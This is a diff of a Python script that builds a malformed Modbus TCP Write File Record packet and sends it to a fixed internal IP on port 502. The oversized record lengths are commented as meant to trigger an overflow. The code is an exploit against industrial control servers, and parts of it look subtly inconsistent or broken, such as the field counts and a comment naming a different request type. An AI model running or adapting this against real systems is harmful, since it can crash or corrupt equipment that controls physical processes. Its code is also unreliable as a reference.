@@ -1,42 +1,44 @@
 import socket
 from scapy.all import *
+from scapy.contrib.modbus import *
 import logging
 
 logging.basicConfig(level=logging.DEBUG)
 
 def create_exploit_packet():
     # Modbus TCP header
-    transaction_id = 0x0001
-    protocol_id = 0x0000
-    length = 0x0014  # Adjusted length for additional payload
-    unit_id = 0x01
+    transaction_id = 1
+    protocol_id = 0
+    length = 17  # Length for ModbusADU + ModbusPDU05WriteSingleCoilRequest
+    unit_id = 1
 
     # Modbus function code and payload
-    function_code = 0x15  # Example function code
-    reference_type = 0x06  # Correct reference type for file record request
-    file_number = 0x0001
-    record_number = 0x0000
+    function_code = 0x15  # Example function code for Write File Record
+    reference_type = 6  # Correct reference type for file record request
+    file_number = 1
+    record_number = 0
     record_length_1 = 0xfffe  # First record length to trigger overflow
     record_length_2 = 0xfffb  # Second record length to continue the loop
 
-    # Construct the payload
-    payload = struct.pack('>BHHHBHHH', function_code, reference_type, file_number, record_number, record_length_1, 0xFF, reference_type, file_number, record_number, record_length_2)
+    # Construct the payload using Scapy
+    modbus_request = ModbusADURequest(transId=transaction_id, protoId=protocol_id, len=length, unitId=unit_id) / \
+                     ModbusPDU15WriteFileRecordRequest(referenceType=reference_type, fileNum=file_number, recNum=record_number, recLen1=record_length_1, data1=0xFF, recLen2=record_length_2)
 
-    # Construct the Modbus TCP packet
-    modbus_packet = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id) + payload
-
-    return modbus_packet
+    return modbus_request
 
 def send_modbus_request():
     try:
         modbus_request = create_exploit_packet()
         
+        # Convert the Scapy packet to raw bytes
+        request_data = bytes(modbus_request)
+        
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('10.103.152.8', 502))
         logging.info("Connected to server.")
         
-        s.send(modbus_request)
-        logging.debug('Sent Modbus request: %s', repr(modbus_request))
+        s.send(request_data)
+        logging.debug('Sent Modbus request: %s', repr(request_data))
         
         response = s.recv(1024)
         logging.debug('Received response: %s', repr(response))
